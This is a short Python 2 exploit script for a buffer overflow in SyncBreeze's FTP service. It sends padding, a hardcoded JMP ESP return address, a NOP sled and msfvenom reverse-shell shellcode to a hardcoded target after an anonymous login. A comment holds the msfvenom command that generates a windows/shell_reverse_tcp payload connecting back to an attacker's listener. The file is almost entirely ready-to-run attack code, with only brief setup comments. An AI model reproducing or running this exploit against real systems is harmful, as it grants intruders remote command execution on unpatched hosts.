#This is the Final Code of Buffer Overflow of the SyncBreeze. 
#Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
#This script is based on python2

import socket, os, sys

#JMP ESP = 7c9d30d7

buf = "A"*251 + "\xd7\x30\x9d\x7c" + "\x90" * 20

#msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00\x0a\x0d"

buf += b"\xd9\xeb\xbe\xb4\xb0\xea\xa0\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x31\x77\x17\x83\xef\xfc\x03\xc3\xa3\x08"
buf += b"\x55\xd7\x2c\x4e\x96\x27\xad\x2f\x1e\xc2\x9c\x6f\x44"
buf += b"\x87\x8f\x5f\x0e\xc5\x23\x2b\x42\xfd\xb0\x59\x4b\xf2"
buf += b"\x71\xd7\xad\x3d\x81\x44\x8d\x5c\x01\x97\xc2\xbe\x38"
buf += b"\x58\x17\xbf\x7d\x85\xda\xed\xd6\xc1\x49\x01\x52\x9f"
buf += b"\x51\xaa\x28\x31\xd2\x4f\xf8\x30\xf3\xde\x72\x6b\xd3"
buf += b"\xe1\x57\x07\x5a\xf9\xb4\x22\x14\x72\x0e\xd8\xa7\x52"
buf += b"\x5e\x21\x0b\x9b\x6e\xd0\x55\xdc\x49\x0b\x20\x14\xaa"
buf += b"\xb6\x33\xe3\xd0\x6c\xb1\xf7\x73\xe6\x61\xd3\x82\x2b"
buf += b"\xf7\x90\x89\x80\x73\xfe\x8d\x17\x57\x75\xa9\x9c\x56"
buf += b"\x59\x3b\xe6\x7c\x7d\x67\xbc\x1d\x24\xcd\x13\x21\x36"
buf += b"\xae\xcc\x87\x3d\x43\x18\xba\x1c\x0c\xed\xf7\x9e\xcc"
buf += b"\x79\x8f\xed\xfe\x26\x3b\x79\xb3\xaf\xe5\x7e\xb4\x85"
buf += b"\x52\x10\x4b\x26\xa3\x39\x88\x72\xf3\x51\x39\xfb\x98"
buf += b"\xa1\xc6\x2e\x0e\xf1\x68\x81\xef\xa1\xc8\x71\x98\xab"
buf += b"\xc6\xae\xb8\xd4\x0c\xc7\x53\x2f\xc7\x28\x0b\x2e\x0e"
buf += b"\xc1\x4e\x30\x34\xc3\xc6\xd6\x5e\xf3\x8e\x41\xf7\x6a"
buf += b"\x8b\x19\x66\x72\x01\x64\xa8\xf8\xa6\x99\x67\x09\xc2"
buf += b"\x89\x10\xf9\x99\xf3\xb7\x06\x34\x9b\x54\x94\xd3\x5b"
buf += b"\x12\x85\x4b\x0c\x73\x7b\x82\xd8\x69\x22\x3c\xfe\x73"
buf += b"\xb2\x07\xba\xaf\x07\x89\x43\x3d\x33\xad\x53\xfb\xbc"
buf += b"\xe9\x07\x53\xeb\xa7\xf1\x15\x45\x06\xab\xcf\x3a\xc0"
buf += b"\x3b\x89\x70\xd3\x3d\x96\x5c\xa5\xa1\x27\x09\xf0\xde"
buf += b"\x88\xdd\xf4\xa7\xf4\x7d\xfa\x72\xbd\x8e\xb1\xde\x94"
buf += b"\x06\x1c\x8b\xa4\x4a\x9f\x66\xea\x72\x1c\x82\x93\x80"
buf += b"\x3c\xe7\x96\xcd\xfa\x14\xeb\x5e\x6f\x1a\x58\x5e\xba"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)


#RHOST = 192.168.1.27 (Change according to your IP)
#RPORT = 21 (Change according to your Vulnerable service port)

s.connect(('192.168.1.27', 21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send(buf + '\r\n')
s.send('QUIT\r\n')
s.close()
